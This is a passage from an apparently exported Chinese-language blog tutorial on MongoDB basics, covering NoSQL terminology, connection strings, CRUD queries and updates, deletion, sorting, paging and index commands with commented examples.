如果传递一个空对象，会把所有数据删除</span></span><br><span class=\"line\"></span><br><span class=\"line\">db.&lt;collecetion&gt;.remove(&#123;&#125;) <span class=\"comment\"># 性能较差，删除数据，但是不清空集合</span></span><br><span class=\"line\"></span><br><span class=\"line\">db.&lt;collecetion&gt;.deleteOne(删除条件)</span><br><span class=\"line\">db.&lt;collecetion&gt;.deleteMany(删除条件)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show collecetions</span><br><span class=\"line\">db.dropDatabase() <span class=\"comment\"># 删除 数据库</span></span><br><span class=\"line\">db.&lt;collecetion&gt;.drop() <span class=\"comment\"># 清空集合</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"条件操作符\"><a href=\"#条件操作符\" class=\"headerlink\" title=\"条件操作符\"></a>条件操作符</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$gt</span> &gt; <span class=\"variable\">$gte</span> &gt;=  <span class=\"variable\">$lt</span>  &lt; <span class=\"variable\">$lte</span> &lt;=  <span class=\"variable\">$ne</span> !=  <span class=\"variable\">$eq</span>  =</span><br></pre></td></tr></table></figure>\n<h3 id=\"type操作符\"><a href=\"#type操作符\" class=\"headerlink\" title=\"$type操作符\"></a>$type操作符</h3><p> 根据字符数据类型查询</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.col.insert([</span><br><span class=\"line\">\t&#123;title: <span class=\"string\">'PHP 教程'</span>&#125;,</span><br><span class=\"line\">\t&#123;title: <span class=\"string\">'Java 教程'</span>&#125;,</span><br><span class=\"line\">\t&#123;title: <span class=\"string\">'MongoDB 教程'</span>&#125;</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询 title 为 string 的文档</span></span><br><span class=\"line\">db.col.find(&#123;<span class=\"string\">\"title\"</span> : &#123;<span class=\"variable\">$type</span> : 2&#125;&#125;)</span><br><span class=\"line\">或</span><br><span class=\"line\">db.col.find(&#123;<span class=\"string\">\"title\"</span> : &#123;<span class=\"variable\">$type</span> : <span class=\"string\">'string'</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Limit与Skip方法\"><a href=\"#Limit与Skip方法\" class=\"headerlink\" title=\"Limit与Skip方法\"></a>Limit与Skip方法</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.COLLECTION_NAME.find().<span class=\"built_in\">limit</span>(NUMBER) <span class=\"comment\"># 限制查询多少条</span></span><br><span class=\"line\">db.COLLECTION_NAME.find().skip(NUMBER) <span class=\"comment\"># 跳过多少条</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"sort-方法\"><a href=\"#sort-方法\" class=\"headerlink\" title=\"sort() 方法\"></a>sort() 方法</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.col.find(&#123;&#125;).sort(&#123;<span class=\"string\">\"likes\"</span>:-1&#125;) <span class=\"comment\"># 数据按字段 likes 的降序排列 1为升序 -1为降序</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"createIndex-方法\"><a href=\"#createIndex-方法\" class=\"headerlink\" title=\"createIndex() 方法\"></a>createIndex() 方法</h3><p>索引存储在一个易于遍历读取的数据集合中，索引是对数据库表中一列或多列的值进行排序的一种结构。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.col.createIndex(&#123;<span class=\"string\">\"title\"</span>:1&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1、查看集合索引</span></span><br><span class=\"line\">db.col.getIndexes()</span><br><span class=\"line\"><span class=\"comment\"># 2、查看集合索引大小</span></span><br><span class=\"line\">db.col.totalIndexSize()</span><br><span class=\"line\"><span class=\"comment\"># 3、删除集合所有索引</span></span><br><span class=\"line\">db.col.dropIndexes()</span><br><span class=\"line\"><span class=\"comment\"># 4、删除集合指定索引</span></span><br><span class=\"line\">db.col.dropIndex(<span class=\"string\">\"索引名称\"</span>)</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>1.<a href=\"https://www.cnblogs.com/clsn/p/8214194.html#auto_id_0\" target=\"_blank\" rel=\"noopener\">MONGODB入门篇</a></p>\n<p>2.<a href=\"https://cloud.tencent.com/developer/article/1455000\" target=\"_blank\" rel=\"noopener\">centos安装mongodb 4.x及配置用户名密码（官方推荐的方式）</a></p>\n<p>3.<a href=\"https://docs.mongodb.com/manual/\" target=\"_blank\" rel=\"noopener\">MONGODB手册</a></p>\n<p>4.<a href=\"https://developer.mozilla.org/zh-CN/docs/Learn/Server-side/Express_Nodejs/mongoose\" target=\"_blank\" rel=\"noopener\">Express 教程 3：使用数据库 (Mongoose)</a></p>\n<p>5.<a href=\"https://www.runoob.com/mongodb/mongodb-tutorial.html\" target=\"_blank\" rel=\"noopener\">菜鸟教程</a></p>\n<h2 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h2><h3 id=\"NoSQL\"><a href=\"#NoSQL\" class=\"headerlink\" title=\"NoSQL\"></a>NoSQL</h3><p>NoSQL(NoSQL = Not Only SQL )，意即”不仅仅是SQL”。</p>\n<p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</p>\n<p>NoSQL用于超大规模数据的存储。（例如个人信息，社交网络，地理位置，用户生成的数据和用户操作日志）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>\n<h3 id=\"基本术语\"><a href=\"#基本术语\" class=\"headerlink\" title=\"基本术语\"></a>基本术语</h3><table>\n<thead>\n<tr>\n<th style=\"text-align:left\">SQL术语/概念</th>\n<th style=\"text-align:left\">MongoDB术语/概念</th>\n<th style=\"text-align:left\">解释/说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">database</td>\n<td style=\"text-align:left\">database</td>\n<td style=\"text-align:left\">数据库</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">table</td>\n<td style=\"text-align:left\">collection</td>\n<td style=\"text-align:left\">数据库表/集合</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">row</td>\n<td style=\"text-align:left\">document</td>\n<td style=\"text-align:left\">数据记录行/文档</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">column</td>\n<td style=\"text-align:left\">field</td>\n<td style=\"text-align:left\">数据字段/域</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">index</td>\n<td style=\"text-align:left\">index</td>\n<td style=\"text-align:left\">索引</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">table joins</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\">表连接,MongoDB不支持</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">primary key</td>\n<td style=\"text-align:left\">primary key</td>\n<td style=\"text-align:left\">主键,MongoDB自动将_id字段设置为主键</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h3><p>一个mongodb中可以建立多个数据库。</p>\n<p>数据库命名规范：</p>\n<ul>\n<li>不能是空字符串（””)。</li>\n<li>不得含有’ ‘（空格)、.、$、/、\\和\\0 (空字符)。</li>\n<li>应全部小写。</li>\n<li>最多64字节。</li>\n</ul>\n<p>数据库保留字：<code>admin</code>、<code>local</code>、<code>config</code></p>\n<h3 id=\"文档\"><a href=\"#文档\" class=\"headerlink\" title=\"文档\"></a>文档</h3><p>RDBMS 与 MongoDB 对应的术语：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">RDBMS</th>\n<th style=\"text-align:left\">MongoDB</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">数据库</td>\n<td style=\"text-align:left\">数据库</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">表格</td>\n<td style=\"text-align:left\">集合</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">行</td>\n<td style=\"text-align:left\">文档</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">列</td>\n<td style=\"text-align:left\">字段</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">表联合</td>\n<td style=\"text-align:left\">嵌入文档</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">主键</td>\n<td style=\"text-align:left\">主键 (MongoDB 提供了 key 为 _id )</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"数据库基本操作\"><a href=\"#数据库基本操作\" class=\"headerlink\" title=\"数据库基本操作\"></a>数据库基本操作</h2><ul>\n<li>MongoDB连接</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># mongodb://admin:123456@localhost/test</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"CRUD\"><a href=\"#CRUD\" class=\"headerlink\" title=\"CRUD\"></a>CRUD</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 展示数据库</span></span><br><span class=\"line\">show dbs</span><br><span class=\"line\"><span class=\"comment\"># 创建或进入数据库（如果该数据库中没有数据，将不会 show dbs 中子展示出来）</span></span><br><span class=\"line\">use mydb</span><br><span class=\"line\"><span class=\"comment\"># 向mydb的mycol集合中插入一条数据</span></span><br><span class=\"line\">db.mycol.insert(&#123;<span class=\"string\">\"name\"</span>: <span class=\"string\">\"houfei\"</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\"># MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://www.runoob.com/mongodb/mongodb-create-collection.html\" target=\"_blank\" rel=\"noopener\">创建/删除集合</a></li>\n</ul>\n<p><code>db.createCollection(name, options)</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建或进入数据库（如果该数据库中没有集合时，将不会 show dbs 中子展示出来）</span></span><br><span class=\"line\">use mydb</span><br><span class=\"line\"><span class=\"comment\"># 创建mycol集合</span></span><br><span class=\"line\">db.createCollection(<span class=\"string\">\"mycol\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># 在 MongoDB 中，你不需要创建集合。当你插入一些文档时，MongoDB 会自动创建集合。</span></span><br><span class=\"line\">db.mycol.insert(&#123;<span class=\"string\">\"name\"</span>: <span class=\"string\">\"houfei\"</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 进入数据库</span></span><br><span class=\"line\">use mydb</span><br><span class=\"line\"><span class=\"comment\"># 查看已存在的集合</span></span><br><span class=\"line\">show collections</span><br><span class=\"line\"><span class=\"comment\"># 删除集合 mycol</span></span><br><span class=\"line\">db.mycol.drop()</span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://www.runoob.com/mongodb/mongodb-insert.html\" target=\"_blank\" rel=\"noopener\">文档的CRUD</a></li>\n</ul>\n<p><strong>插入文档</strong>——<code>db.&lt;collecetion&gt;.insert(document)</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 向test数据库中插入stus集合中插入一个新的学生对象</span></span><br><span class=\"line\">db.stus.insert(</span><br><span class=\"line\">  &#123;name: <span class=\"string\">\"小明\"</span>, gender: <span class=\"string\">\"男\"</span>&#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 向test数据库中插入teather集合中插入2个新的老师对象</span></span><br><span class=\"line\">db.teather.insert([</span><br><span class=\"line\">  &#123;name: <span class=\"string\">\"马云\"</span>, gender: <span class=\"string\">\"男\"</span>&#125;,</span><br><span class=\"line\">  &#123;name: <span class=\"string\">\"马化腾\"</span>, gender: <span class=\"string\">\"男\"</span>&#125;</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># db.stus.insertOne() 插入一个</span></span><br><span class=\"line\"><span class=\"comment\"># db.stus.insertMany() 插入多个</span></span><br></pre></td></tr></table></figure>\n<p><strong>查询文档</strong>——<code>db.&lt;collection&gt;.find(query（查询条件）, projection（投影）)</code></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">操作</th>\n<th style=\"text-align:center\">格式</th>\n<th style=\"text-align:left\">范例</th>\n<th style=\"text-align:left\">RDBMS中的类似语句</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">等于</td>\n<td style=\"text-align:center\"><code>{:</code>}</td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;by&quot;:&quot;菜鸟教程&quot;}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where by = &#39;菜鸟教程&#39;</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">小于</td>\n<td style=\"text-align:center\"><code>{:{$lt:}}</code></td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;likes&quot;:{$lt:50}}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where likes &lt; 50</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">小于或等于</td>\n<td style=\"text-align:center\"><code>{:{$lte:}}</code></td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;likes&quot;:{$lte:50}}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where likes &lt;= 50</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">大于</td>\n<td style=\"text-align:center\"><code>{:{$gt:}}</code></td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;likes&quot;:{$gt:50}}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where likes &gt; 50</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">大于或等于</td>\n<td style=\"text-align:center\"><code>{:{$gte:}}</code></td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;likes&quot;:{$gte:50}}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where likes &gt;= 50</code></td>\n</tr>\n<tr>\n<td style=\"text-align:left\">不等于</td>\n<td style=\"text-align:center\"><code>{:{$ne:}}</code></td>\n<td style=\"text-align:left\"><code>db.col.find({&quot;likes&quot;:{$ne:50}}).pretty()</code></td>\n<td style=\"text-align:left\"><code>where likes != 50</code></td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查询 “likes” 大于50，并且“by”为“菜鸟教程”或者“title”为“MongoDB 教程”的数据</span></span><br><span class=\"line\">db.col.find(&#123;</span><br><span class=\"line\">\t<span class=\"string\">\"likes\"</span>: &#123;<span class=\"variable\">$gt</span>:50&#125;,</span><br><span class=\"line\">\t<span class=\"variable\">$or</span>: [&#123;<span class=\"string\">\"by\"</span>: <span class=\"string\">\"菜鸟教程\"</span>&#125;,&#123;<span class=\"string\">\"title\"</span>: <span class=\"string\">\"MongoDB 教程\"</span>&#125;]</span><br><span class=\"line\">&#125;).pretty()</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://docs.mongodb.com/manual/reference/method/db.collection.find/#query-an-array-of-documents\" target=\"_blank\" rel=\"noopener\"><em>案例</em></a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 向 bios 集合插入如下文档</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"_id\"</span> : &lt;value&gt;,</span><br><span class=\"line\">    <span class=\"string\">\"name\"</span> : &#123; <span class=\"string\">\"first\"</span> : &lt;string&gt;, <span class=\"string\">\"last\"</span> : &lt;string&gt; &#125;,       // embedded document</span><br><span class=\"line\">    <span class=\"string\">\"birth\"</span> : &lt;ISODate&gt;,</span><br><span class=\"line\">    <span class=\"string\">\"death\"</span> : &lt;ISODate&gt;,</span><br><span class=\"line\">    <span class=\"string\">\"contribs\"</span> : [ &lt;string&gt;, ... ],                           // Array of Strings</span><br><span class=\"line\">    <span class=\"string\">\"awards\"</span> : [</span><br><span class=\"line\">        &#123; <span class=\"string\">\"award\"</span> : &lt;string&gt;, year: &lt;number&gt;, by: &lt;string&gt; &#125;  // Array of embedded documents</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 全部查询</span></span><br><span class=\"line\"><span class=\"comment\"># 查询所有数据</span></span><br><span class=\"line\">db.bios.find()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 标准查询</span></span><br><span class=\"line\"><span class=\"comment\"># 查询_id 为5的数据</span></span><br><span class=\"line\">db.bios.find( &#123; _id: 5 &#125; )</span><br><span class=\"line\"><span class=\"comment\"># 查询 name 对象下的 last 属性值为 Hopper 的所有数据</span></span><br><span class=\"line\">db.bios.find( &#123; <span class=\"string\">\"name.last\"</span>: <span class=\"string\">\"Hopper\"</span> &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用运算符的查询</span></span><br><span class=\"line\"><span class=\"comment\"># 使用$in操作符返回id等于5和ObjectId为(“507c35dd8fada716c89d0013”)的文档</span></span><br><span class=\"line\">db.bios.find(</span><br><span class=\"line\">   &#123; _id: &#123; <span class=\"variable\">$in</span>: [ 5, ObjectId(<span class=\"string\">\"507c35dd8fada716c89d0013\"</span>) ] &#125; &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询 生日大于 new Date('1950-01-01') 的文档</span></span><br><span class=\"line\">db.bios.find(</span><br><span class=\"line\">\t&#123; birth: &#123; <span class=\"variable\">$gt</span>: new Date(<span class=\"string\">'1950-01-01'</span>) &#125; &#125; </span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询 name 对象下的 last 属性值符合 /^N/表达式 的所有数据</span></span><br><span class=\"line\">db.bios.find(</span><br><span class=\"line\">   &#123; <span class=\"string\">\"name.last\"</span>: &#123; <span class=\"variable\">$regex</span>: /^N/ &#125; &#125;</span><br><span class=\"line\">) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询范围</span></span><br><span class=\"line\"><span class=\"comment\"># 查询 生日大于 new Date('1940-01-01') 小于 new Date('1960-01-01' 的文档</span></span><br><span class=\"line\">db.bios.find( </span><br><span class=\"line\">\t&#123; birth: &#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$gt</span>: new Date(<span class=\"string\">'1940-01-01'</span>),</span><br><span class=\"line\">\t\t<span class=\"variable\">$lt</span>: new Date(<span class=\"string\">'1960-01-01'</span>) </span><br><span class=\"line\">  &#125; &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询 生日大于 new Date('1920-01-01') 并且 death 为 false 的文档</span></span><br><span class=\"line\">db.bios.find( &#123;</span><br><span class=\"line\">   birth: &#123; <span class=\"variable\">$gt</span>: new Date(<span class=\"string\">'1920-01-01'</span>) &#125;,</span><br><span class=\"line\">   death: &#123; <span class=\"variable\">$exists</span>: <span class=\"literal\">false</span> &#125;</span><br><span class=\"line\">&#125; ) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询精确匹配嵌入的文档</span></span><br><span class=\"line\"><span class=\"comment\"># 查询 name 对象为 &#123; first: \"Yukihiro\", last: \"Matsumoto\" &#125; 的文档（包括顺序，并且不能包含其他属性）</span></span><br><span class=\"line\">db.bios.find(</span><br><span class=\"line\">    &#123; name: &#123; first: <span class=\"string\">\"Yukihiro\"</span>, last: <span class=\"string\">\"Matsumoto\"</span> &#125; &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 嵌入式文档的查询字段</span></span><br><span class=\"line\"><span class=\"comment\"># 其中嵌入的文档名称包含第一个值为“Yukihiro”的字段和最后一个值为“Matsumoto”的字段。</span></span><br><span class=\"line\">db.bios.find(</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"string\">\"name.first\"</span>: <span class=\"string\">\"Yukihiro\"</span>,</span><br><span class=\"line\">     <span class=\"string\">\"name.last\"</span>: <span class=\"string\">\"Matsumoto\"</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询数组元素</span></span><br><span class=\"line\"><span class=\"comment\"># 查询数组字段contribs包含元素“UNIX”</span></span><br><span class=\"line\">db.bios.find( &#123; contribs: <span class=\"string\">\"UNIX\"</span> &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 数组字段设计包含元素“ALGOL”或“Lisp”</span></span><br><span class=\"line\">db.bios.find( &#123; contribs: &#123; <span class=\"variable\">$in</span>: [ <span class=\"string\">\"ALGOL\"</span>, <span class=\"string\">\"Lisp\"</span> ]&#125; &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 数组字段设计包含元素“ALGOL”和“Lisp”</span></span><br><span class=\"line\">db.bios.find( &#123; contribs: &#123; <span class=\"variable\">$all</span>: [ <span class=\"string\">\"ALGOL\"</span>, <span class=\"string\">\"Lisp\"</span> ] &#125; &#125; )</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># contribs的数组大小为4</span></span><br><span class=\"line\">db.bios.find( &#123; contribs: &#123; <span class=\"variable\">$size</span>: 4 &#125; &#125; )</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.runoob.com/mongodb/mongodb-update.html\" target=\"_blank\" rel=\"noopener\"><strong>更新文档</strong></a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.collection.update(</span><br><span class=\"line\">   &lt;query&gt;, <span class=\"comment\"># update的查询条件，类似sql update查询内where后面的。</span></span><br><span class=\"line\">   &lt;update&gt;, <span class=\"comment\"># 更新内容</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     upsert: &lt;boolean&gt;, <span class=\"comment\"># 如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。</span></span><br><span class=\"line\">     multi: &lt;boolean&gt;, <span class=\"comment\"># 可选，mongodb 默认是false,是否只更新第一条</span></span><br><span class=\"line\">     writeConcern: &lt;document&gt; <span class=\"comment\"># 可选，抛出异常的级别。</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># db.&lt;collecetion&gt;.update(查询条件, 修改条件)</span></span><br><span class=\"line\"><span class=\"comment\"># - update 会默认将 新对象 替换 旧对象</span></span><br><span class=\"line\"><span class=\"comment\"># - 如果是修改指定的属性，而不是替换，需要使用“替换操作符”来完成修改</span></span><br><span class=\"line\"><span class=\"comment\">#  $set 可以用来修改文档中的指定的属性</span></span><br><span class=\"line\"><span class=\"comment\">#  $unset 可以用来删除文档中的指定的属性</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">db.stus.update(</span><br><span class=\"line\">  &#123;gender: <span class=\"string\">\"女\"</span>, name: <span class=\"string\">\"蜘蛛精\"</span> &#125;,</span><br><span class=\"line\">  &#123;gender: <span class=\"string\">\"男\"</span>, name: <span class=\"string\">\"孙悟空\"</span>, age: 30 &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">db.stus.update(&#123;name: <span class=\"string\">\"one\"</span> &#125;, &#123;</span><br><span class=\"line\">  <span class=\"variable\">$set</span>: &#123;</span><br><span class=\"line\">    gender: <span class=\"string\">\"男\"</span>,</span><br><span class=\"line\">    name: <span class=\"string\">\" 猪八戒\"</span>,</span><br><span class=\"line\">    addr: <span class=\"string\">\"高老庄\"</span></span><br><span class=\"line\">  &#125;</span><br><span 